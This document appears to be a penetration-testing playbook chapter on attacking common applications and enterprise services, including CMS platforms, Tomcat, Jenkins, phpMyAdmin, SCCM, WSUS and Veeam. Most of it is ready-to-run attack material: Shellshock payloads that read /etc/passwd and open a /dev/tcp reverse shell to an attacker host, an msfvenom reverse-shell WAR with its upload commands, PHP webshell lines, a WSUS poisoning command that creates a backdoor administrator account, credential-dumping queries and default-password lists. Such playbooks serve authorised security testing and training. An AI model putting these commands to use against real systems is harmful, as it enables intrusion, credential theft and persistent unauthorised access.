# PHASE 11: COMMON APPLICATIONS

> Identify CMS/app first, then follow app-specific attack path.
> Always check default creds before brute-forcing.

---

## 11.0 - CMS Detection Decision Tree
```
Web App Discovered
├── Fingerprints CMS?
│   ├── /wp-content, /wp-admin, meta generator="WordPress" → WordPress
│   ├── /administrator, /components, /modules, /plugins → Joomla
│   ├── /node, CHANGELOG.txt, meta generator="Drupal" → Drupal
│   └── robots.txt reveals structure → check each path
├── Java stack? (port 8080, 8009)
│   ├── /manager/html → Tomcat (WAR upload RCE)
│   ├── Jenkins UI → Jenkins (Script Console)
│   └── /wsdl, /axis2 → SOAP services
├── .NET stack? (port 80/443, ASPX pages)
│   ├── /Trace.axd, /elmah.axd → Debug/Error info
│   └── DNN (DotNetNuke) → SQL console, file upload
├── PHP stack?
│   ├── phpMyAdmin at /phpmyadmin → DB access
│   └── Laravel/Yii/Symfony → framework-specific vulns
├── Default login portal? → Try creds list per app
├── No auth required? → Splunk Free, open GitLab
└── Unknown app? → searchsploit, CVE lookup, Wappalyzer
```

## 11.0b - CMS-Specific Attacks

### WordPress
```bash
# WPScan
wpscan --url http://<target> --enumerate --api-token <token>
wpscan --url http://<target> --enumerate ap  # All plugins
wpscan --url http://<target> --enumerate at  # All themes

# User enumeration (login page error messages)
# Valid user + wrong pass: "The password for username admin is incorrect"
# Invalid user: "The username someone is not registered"

# Brute force via XML-RPC (faster, batched)
wpscan --url http://<target> --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt

# Theme editor RCE (needs admin)
# Appearance → Theme Editor → 404.php → Add: system($_GET[0]);
# Access: http://<target>/wp-content/themes/theme/404.php?0=id
```

### Joomla
```bash
joomscan -u http://<target>
droopescan scan joomla -u http://<target>
# Check robots.txt for /administrator/
# Default creds: admin:admin
# Template RCE: Extensions → Templates → edit index.php → insert webshell
# CVE-2019-10945: Directory traversal in com_media
```

### Drupal
```bash
# Version detection
curl -s http://<target>/CHANGELOG.txt | head -5
droopescan scan drupal -u http://<target>

# Drupalgeddon2 (CVE-2018-7600) - Unauthenticated RCE
use exploit/unix/drupal/drupal_drupageddon2

# Drupalgeddon3 (CVE-2018-7602) - Authenticated RCE
# Requires valid session cookie

# PHP Filter module (if enabled)
# Admin → Modules → Enable PHP Filter
# Create content → PHP code → <?php system($_GET['cmd']); ?>
```

### Apache Tomcat
```bash
# Default credentials
# tomcat:tomcat, admin:admin, admin:(empty), admin:tomcat, tomcat:s3cret

# WAR upload RCE (after getting manager access)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war
curl -u tomcat:tomcat --upload-file shell.war "http://<target>:8080/manager/text/deploy?path=/shell&update=true"
curl http://<target>:8080/shell/

# Ghostcat (CVE-2020-1938) - AJP LFI
# Reads webapp files via AJP port 8009
nmap -p 8009 <target>  # Check if AJP exposed
```

### ColdFusion
```bash
# Admin panel
# /CFIDE/administrator/index.cfm

# Directory traversal (CVE-2010-2861)
# Read password hashes: /CFIDE/administrator/enter.cfm?locale=../../../../../../lib/password.properties%00en

# Unauthenticated RCE (CVE-2009-2265)
# FCKeditor file upload
```

### Shellshock (CVE-2014-6271)
```bash
# Check CGI scripts
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,cgi,pl

# Exploit via User-Agent
curl -A '() { :; }; echo; /bin/cat /etc/passwd' http://<target>/cgi-bin/status

# Reverse shell
curl -A '() { :; }; /bin/bash -i >& /dev/tcp/<attacker>/<port> 0>&1' http://<target>/cgi-bin/status
```

### IIS Tilde Enumeration
```bash
# 8.3 short name disclosure (Windows/IIS)
# Discover hidden files/dirs via ~1 short names
nmap --script http-enum -p 80 <target>
# Or: IIS-ShortName-Scanner (Java)
java -jar iis_shortname_scanner.jar http://<target>
```

### DotNetNuke (DNN)
```bash
# Default admin: host/dnnhost
# SQL Console: Admin → SQL Console → enable xp_cmdshell
# File upload: Allow .asp/.exe extensions via SQL
# Install Modules: Admin → Extensions → upload malicious module
# CVE-2017-9822: Cookie deserialization RCE
```

## 11.1 - Jenkins
```
├─ Default creds: admin:admin
├─ Script Console: /manage → /script
│  └─ RCE: Runtime.getRuntime().exec("cmd /c powershell ...")
├─ Build job: Create job → Build Steps → Execute shell
└─ CVE check: searchsploit jenkins
```

## 11.2 - Splunk
```
├─ Default creds: admin:changeme
├─ Splunk Universal Forwarder RCE
│  └─ Deploy custom app with reverse shell script
└─ Search → run commands via savedsearches.conf
```

## 11.3 - PRTG Network Monitor
```
├─ Default creds: prtgadmin:prtg
├─ CVE-2018-9276 (RCE via authenticated RCE)
└─ API abuse: /api/table.json?content=devices&columns=device
```

## 11.4 - GitLab
```
├─ Public repos → search for creds, config files
├─ User registration (if open)
├─ API: /api/v4/projects, /api/v4/users
└─ Git clone → search history for secrets: git log -p --all
```

## 11.5 - osTicket
```
├─ Default creds: check docs
├─ File upload via ticket attachment
└─ SQL injection in older versions
```

## 11.6 - phpMyAdmin
```
├─ Default creds: root:(empty), root:root
├─ SQL console → SELECT INTO OUTFILE → webshell
├─ Write to webroot: SET GLOBAL general_log = 'ON'; SET GLOBAL general_log_file = '/var/www/html/shell.php';
└─ UDF RCE: CREATE FUNCTION sys_exec RETURNS STRING
```

## 11.7 - Nagios
```
├─ Default creds: nagiosadmin:nagios
├─ CVE-2016-9566 (RCE)
└─ RCE via config manipulation
```

## 11.8 - SCCM / MECM (Enterprise Networks)

> Microsoft Endpoint Configuration Manager. Site Servers hold Network Access Account creds in plaintext
> in the policy. Frequent path to DA in enterprise networks.

```bash
# Identify SCCM
# - Servers with "MP_" computer accounts, SMS_SiteSystem groups
# - SCCM clients reach out to MP via HTTP

# Enumerate SCCM (SharpSCCM)
.\SharpSCCM.exe local site-info
.\SharpSCCM.exe get site-info -mp <management_point> -sc <sitecode>
.\SharpSCCM.exe get devices -mp <mp> -sc <sitecode>

# Network Access Account (NAA) extraction (CVE-2022-37971 + classic policy abuse)
# Requires: client cert OR any AD-joined machine
python3 sccmwtf.py <client_fqdn> <site_server_fqdn>
# Or
.\SharpSCCM.exe get naa -mp <mp> -sc <sitecode>
# Output: NAA creds → often local admin on many hosts, sometimes DA

# Coerce SCCM site server (auto-relay candidate)
# Site server often has full client-push rights → coerce + relay to LDAPS
python3 PetitPotam.py <attacker> <sccm_site_server>
ntlmrelayx.py -t ldaps://<dc> --delegate-access
```

## 11.9 - WSUS Patch Poisoning (Unauth)

> If WSUS uses HTTP (not HTTPS) for client checkins, push attacker-signed patches to clients.

```bash
# Check WSUS in use
# Client registry: HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\WUServer
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer

# If WUServer is http:// (not https://) → exploit
# PyWSUS — MITM WSUS, inject malicious update
python3 pywsus.py --host 0.0.0.0 --port 8530 --executable /tmp/PsExec64.exe --command '/accepteula /s cmd /c "net user backdoor Pass123! /add && net localgroup administrators backdoor /add"'

# Trigger client check
# Victim: wuauclt /detectnow  →  pulls malicious update  →  RCE as SYSTEM

# Mitigation pre-check: WSUS over HTTPS + signed updates → not vulnerable
```

## 11.10 - Thick Client Applications (ELF / .NET DLL hardcoded creds)
> Binary apps connecting to backend services often hold creds in connection strings.
> CPTS Common Apps module — common in jump boxes + enterprise apps.

**ELF (Linux binary) — extract SQL connection string:**
```bash
# 1. Identify: file <binary>
file ./octopus_checker

# 2. Strings first (quick win)
strings <binary> | grep -iE 'pass|pwd|driver|server=|uid=|conn'

# 3. GDB + PEDA (when string scattered / endianness-reversed)
gdb-peda <binary>
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main                          # locate SQLDriverConnect or similar
gdb-peda$ b *<address_of_SQLDriverConnect>    # breakpoint
gdb-peda$ run
# At breakpoint, inspect RDX register → connection string with creds
gdb-peda$ x/s $rdx

# 4. ltrace / strace (function-call tracing)
ltrace -f ./<binary> 2>&1 | grep -iE 'conn|pass|user'

# 5. Network capture during exec (if connects to localhost DB)
tcpdump -i lo -w cap.pcap &
./<binary>
# Inspect cap.pcap → TDS/MySQL auth packets reveal user/pass
```

**.NET DLL — extract via dnSpy / ILSpy:**
```bash
# 1. Identify: file <dll>; PE header has '.NETFramework'
file ./MultimasterAPI.dll
Get-FileMetaData .\MultimasterAPI.dll

# 2. Open in dnSpy (https://github.com/dnSpyEx/dnSpy)
#    - dnSpy → drag .dll → expand namespaces → find Controllers / config classes
#    - Look for: SqlConnection(connectionString), ConfigurationManager.AppSettings
#    - Connection string format: Server=...;Database=...;User Id=...;Password=...;

# 3. Alt: ilspycmd CLI
ilspycmd <binary>.dll > decompiled.cs
grep -iE 'password|connectionstring|pwd' decompiled.cs

# 4. Reflexil / dotPeek — alternatives

# Common extractables
# - DB connection strings (SQL Server, MySQL, PostgreSQL)
# - API keys / OAuth secrets
# - Encryption keys hardcoded
# - LDAP bind credentials
# - SMTP relay creds
# - SOAP/WSDL endpoints
```

**Java JAR — extract via JD-GUI / Procyon / CFR:**
```bash
# Decompile JAR
jd-gui app.jar                                # GUI
procyon -jar app.jar -o ./decompiled/         # CLI
cfr-decompiler app.jar > decompiled.java

# Search for creds
grep -rniE 'password|secret|api[_-]?key|jdbc:' ./decompiled/
```

**Windows PE (non-.NET) — extract via Ghidra/IDA:**
```bash
# Strings → URLs / hostnames / config-file paths
strings.exe <binary> | findstr /i "http password user config"

# Ghidra Free + Decompiler view → review main()
# Resource Hacker → check embedded resources (sometimes plaintext config XML)
```

**Mitigation reminder for report:**
- Move secrets to environment variables / Windows Credential Manager / Azure Key Vault.
- Use OS-level cred storage instead of hardcoding.
- If unavoidable, encrypt config file with DPAPI (Windows) or sealed-secrets (K8s).

## 11.11 - LDAP-Speaking Devices (printers, MFPs, NAS web admin)
> Many devices have LDAP "Test Connection" feature that leaks bind credentials to attacker-controlled LDAP.

```bash
# 1. Find printer/MFP admin page (default creds often work)
# Common: admin:admin, admin:password, admin:1234, admin:(empty)
# Common admin URLs: /hp/device/this.LCDispatcher, /general/status.html, /web/auth.html

# 2. Modify LDAP server IP to attacker IP
# 3. Start netcat listener on 389
sudo nc -lvnp 389
# 4. Click "Test Connection" on device
# → bind creds (often clear-text, sometimes NTLM) sent to nc listener

# Alt: full LDAP server (when device requires real LDAP response)
# Use https://github.com/grimhacker/offensive-ldap or
sudo python3 -m ldap3.utils.server
```

## 11.12 - Veeam Backup Server

> Veeam stores credentials (often DA / service accounts) in its config DB. Always check if you can
> read the Veeam database or hit the Veeam API.

```bash
# Identify
# - Port 9392 (Veeam API), 9401 (mount svc), 10006 (svc)
nmap -p 9392,9401,10006 -sV <target>

# If we have local admin on Veeam Backup Server:
# Dump creds from MSSQL "VeeamBackup" DB
.\Veeam-Get-Creds.ps1
# Or PowerShell direct query:
Invoke-Sqlcmd -ServerInstance "VEEAMSERVER\VEEAMSQL2016" -Database "VeeamBackup" -Query "SELECT user_name, password FROM Credentials"
# Decrypt with Veeam DPAPI key (key in registry / config)

# CVE-2023-27532 — pre-auth credential exposure on Veeam Backup & Replication v11/v12
# Affects port 9401
python3 CVE-2023-27532.py -t <target> -p 9401
```

---